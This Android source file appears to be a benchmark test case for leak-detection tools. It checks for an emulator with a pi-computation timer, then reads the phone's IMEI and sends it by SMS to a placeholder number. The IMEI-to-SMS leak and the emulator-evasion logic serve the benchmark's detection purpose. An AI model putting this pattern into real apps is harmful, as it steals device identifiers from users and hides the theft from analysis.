package com.example.newedtester;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.TimeZone;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.view.Menu;
import android.widget.Button;
import android.widget.TextView;

/**
 * @testcase_name EmulatorDetection_PI1
 * @version 0.1
 * @author Malviya National Institute of Technology, Jaipur INDIA
 * @author_mail jyotigajrani@gmail.com
 *
 * @description This test detects the Android emulator by doing a large computation
 * i.e calculating value of pi till n decimal places. A threshhold value is obtained
 * by doing experiments on 100 devices and emulators. Based on this threshhold value,
 * a decision is taken. This app send IMEI number  via SMS if the app runs on a real
 * phone.
 * @dataflow onCreate: imei -> SMS
 * @number_of_leaks 1
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity implements View.OnClickListener {

    TextView txt3;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Button btn = (Button) findViewById(R.id.button2);
        btn.setOnClickListener(this);
    }

    @Override
    public void onClick(View view) {
        // TODO Auto-generated method stub
        int id = view.getId();
        if (id == R.id.button2) {
            int hours, minutes, seconds;
            hours = minutes = seconds = 0;
            if (minutes > 1 && seconds > 40)
                txt3.setText("Time: Possibly Emulator");
            else {
                TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                String imei = telephonyManager.getDeviceId();
                SmsManager sm = SmsManager.getDefault();
                String number = "+49 1234";
                // sink,
                sm.sendTextMessage(number, null, imei, null, null);
                // potential
            }
        }
    }
}
